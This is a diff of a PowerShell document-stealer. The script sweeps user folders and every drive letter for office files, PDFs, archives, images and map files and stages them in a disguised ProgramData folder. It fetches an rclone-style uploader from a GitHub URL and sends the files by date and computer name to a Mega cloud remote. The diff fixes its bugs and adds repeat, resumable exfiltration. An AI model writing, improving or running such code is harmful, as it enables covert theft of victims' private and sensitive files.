@@ -15,71 +15,94 @@ param (
     )
     
         $files = (Get-ChildItem -Path $LocalPath -Recurse -Include $exts -Exclude "~$*") | Where-Object {$_.Length -lt $size}
-        if ($WhichCopy = 'Stream') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) } }
-        if ($WhichCopy = 'First') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-500) } }
+        if ($WhichCopy -eq 'Stream') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) } }
+        if ($WhichCopy -eq 'First') { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-500) } }
     
         foreach ($file in $files) {         
-            $num = 1
-            $tempDestDir = ($destDir + 'tempDir\'); New-Item $tempDestDir -ItemType Directory -ea 0
+            New-Item $tempDestDir -ItemType Directory -ea 0
             Copy-Item -Force $file.FullName $tempDestDir
             $newFile = ($tempDestDir + $file.Name)
 
             $hash = (Get-FileHash -Algorithm MD5 $newFile).hash
             if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
                 $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
-                if ($WhichCopy = 'First') {
-                    Move-Item -Force $newFile.FullName -Destination $allDestDir
+                if ($WhichCopy -eq 'First') {
+                    Move-Item -Force $newFile -Destination $allDestDir
+                    $hash | Out-File -Encoding utf8 -FilePath $hashfile -Append
                 }
-                if ($WhichCopy = 'Stream') {
+                if ($WhichCopy -eq 'Stream') {
                     New-Item $sendDestDir -ItemType Directory -ea 0 
-                    Move-Item -Force $newFile.FullName -Destination $sendDestDir
+                    Copy-Item -Force $newFile -Destination $sendDestDir
+                    $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
+                    $hash | Out-File -Encoding utf8 -FilePath $sucup -Append
                 }
                     
-                $hash | Out-File -Encoding utf8 -FilePath $sucup -Append
             } else { 
                 ($file.FullName + " : --- OLD FILE ---") | Out-File -Encoding utf8 -FilePath $logfile -Append
                 del -Force $newFile
             }
         }
-        del -Recurse -Force $tempDestDir
     }
 
 
     function Secure-Copy {
     param (
-        [string]$WhichCopy
+        [string]$switchCopy
     )
         
         foreach ($usersDir in (gci $srcdir)) {
             foreach ($deskDir in $deskDirs) { 
-                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -WhichCopy $WhichCopy 
+                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -WhichCopy $switchCopy 
             }
         }
         foreach ($allPath in $allPaths) { 
             if (Test-Path -Path $allPath) {
-                SearchAndCopy -LocalPath $allPath -WhichCopy $WhichCopy 
+                SearchAndCopy -LocalPath $allPath -WhichCopy $switchCopy 
             }
         }
     }
 
+    function Download-All {
+        echo "Upload Documents . . ." 
+        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
+        del -Force -Recurse $allDestDir
+        del -Force -Recurse $tempDestDir
+        del -Force $firstMark
+        New-Item $firstEndMark -ItemType Directory -ea 0
+    }
+
+    function Download-Stream {
+        echo "Upload Documents . . ."
+        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
+        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
+        del -Force $sucup
+        del -Force -Recurse $tempDestDir
+        del -Force -recurse $sendDestDir
+    }
 
     [bool]$second = $false
     $baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
-    $appsDir = $baseDir + 'Apps\'; New-Item $appsDir -ItemType Directory -ea 0
+    $appsDir = ($baseDir + 'Apps\'); New-Item $appsDir -ItemType Directory -ea 0
+    if ((Test-Path ($appsDir + 'rc.exe')) -eq $false) {
+        Invoke-WebRequest -Uri "https://github.com/jensack/stream/raw/main/rc.zip" -OutFile ($appsDir + 'rc.zip')
+        Expand-Archive -Path ($appsDir + 'rc.zip') -DestinationPath $appsDir
+        del -force ($appsDir + 'rc.zip')        
+    }
+
     $srcdir = 'C:\Users\'
     $allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
     $destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0
-    $sucup = ($destDir + 'sucup.txt'); del -force $sucup; New-Item $sucup -ItemType File -ea 0
+    $tempDestDir = ($destDir + 'tempDir\')
 
-    $allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
-    $hashfile = ($destDir + 'checksum.txt') ;New-Item $hashfile -ItemType File -ea 0
+    $hashfile = ($destDir + 'checksum.txt'); New-Item $hashfile -ItemType File -ea 0
     $logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0
 
-#$currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
+    $currTime = (Get-Date -UFormat %H.%M)
+    $currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
     $currDate = (Get-Date -UFormat %d.%m.%y)
     $currYear = (Get-Date -UFormat %Y)
     $size = 100*1024*1024
-    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
+    $exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*дск*','*.kme','*.kml','*.kmz','*.scene','*.json','*zones.txt','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
     $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
 
     if ($objName -eq "") { $objName = $env:COMPUTERNAME }
@@ -93,37 +116,38 @@ param (
 
     if ($Stream -OR $First) { 
         echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
+        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $hashfile -Append
         $CurrDateTime | Out-File -Encoding utf8 -FilePath $logfile -Append
+        $CurrDateTime | Out-File -Encoding utf8 -FilePath $hashfile -Append
+        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $hashfile -Append
         echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
     }
 
     if ($First) {
-        Secure-Copy -WhichCopy First
-        echo "Upload Documents . . ." 
-        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
-        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
-        del -force $sucup
+        $firstEndMark = ($destDir + 'firstEndMark.txt')
+        if (Test-Path $firstEndMark) { echo "First Copy is over"; Invoke-StreamCopy -Stream -objName $objName; return }
+        $allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
+        $firstMark = ($destDir + 'firstMark.txt')
+        if (Test-Path $firstMark) { Download-All; return }
+        else {
+            Secure-Copy -switchCopy First
+            New-Item $firstMark -ItemType File -ea 0
+            Download-All
+        }
     }
 
-    if ($DownAll) {
-        echo "Upload Documents . . ." 
-        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
-        Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
-        del -force $sucup
-    }
+    if ($DownAll) { Download-All }
+        
     
     if ($Stream) {
-        $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
-        $sendDestDir = ($destDir + $currYear + '\' + $currDate)
+        $sucup = ($destDir + 'sucup.txt'); del -ErrorAction SilentlyContinue -Force $sucup; New-Item $sucup -ItemType File -ea 0
+        $etalonhash = (Get-FileHash -Algorithm MD5 $sucup).hash
+        $sendDestDir = ($destDir + $currYear + '\' + $currDate + '\')
         
-        Secure-Copy -WhichCopy Stream
+        Copy-Item -Force -Recurse ($tempDestDir + '\*') $sendDestDir
+        Secure-Copy -switchCopy Stream
 
-        $newhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
-        if ($newhash -ne $etalonhash) {
-            echo "Upload Documents . . ."
-            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
-            Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
-            del -force $sucup
-        }
+        $newhash = (Get-FileHash -Algorithm MD5 $sucup).hash
+        if ($newhash -ne $etalonhash) { Download-Stream }
     }
 }
